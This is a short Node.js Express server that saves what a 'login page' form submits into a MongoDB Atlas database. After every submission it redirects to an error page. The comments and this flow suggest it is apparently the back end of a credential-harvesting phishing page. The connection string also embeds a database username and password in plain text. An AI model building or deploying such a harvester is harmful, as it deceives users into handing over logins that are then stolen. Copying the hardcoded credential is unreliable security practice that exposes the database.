const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');

// Create express app
const app = express();

// Use body-parser middleware
app.use(bodyParser.urlencoded({ extended: true }));

// Connect to MongoDB Atlas database
mongoose.connect('mongodb+srv://myDB:3216549r@cluster0.99to42f.mongodb.net/GreatDB', { useNewUrlParser: true })
  .then(() => {
    console.log('Connected to database!');
  })
  .catch((error) => {
    console.error('Error connecting to database:', error);
  });

// Define note schema and model
const notesSchema = new mongoose.Schema({
  title: String,
  content: String,
});

const Note = mongoose.model('Note', notesSchema);

// Serve login page
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

app.get('/style.css', function(req, res) {
  res.sendFile(__dirname + "/" + "style.css");
});

app.get('/error.html', function(req, res) {
  res.sendFile(__dirname + "/" + "/error.html");
});


app.get('/style.css', function(req, res) {
  res.sendFile(__dirname + "/" + "style.css");
});
// Handle login form submission
app.post('/', (req, res) => {
  const newNote = new Note({
    title: req.body.title,
    content: req.body.content,
  });

  newNote.save()
    .then(() => {
      console.log('Note saved!');
      res.redirect('/error.html');
    })
    .catch((error) => {
      console.error('Error saving note:', error);
      res.status(500).send('Internal server error');
    });
});

// Start server
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
